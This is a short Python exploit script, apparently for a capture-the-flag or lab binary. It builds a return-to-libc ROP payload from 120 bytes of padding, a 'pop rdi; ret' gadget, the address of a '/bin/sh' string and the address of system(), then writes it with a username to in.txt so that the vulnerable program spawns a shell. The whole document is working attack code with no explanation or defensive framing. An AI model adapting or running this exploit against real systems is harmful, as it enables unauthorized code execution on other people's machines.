
#!/usr/bin/env python

from struct import *
from socket import *

username = "doesntmatter\n"
payload = ""
payload += "A"*120
#payload += "BBBBBB"
#ropgadget, pop rdi; ret;
payload += pack("Q", 0x00000000004006cb)

#bin/sh
payload += pack("Q", 0x40086f)
#need padding (this prints out the library version)
#to avoid a strange error
payload += pack("Q", 0x7ffff7a05ca0)
#system()
payload += pack("Q", 0x7ffff7a33440)

f = open ("in.txt", "w")
f.write(username + payload)
f.close()
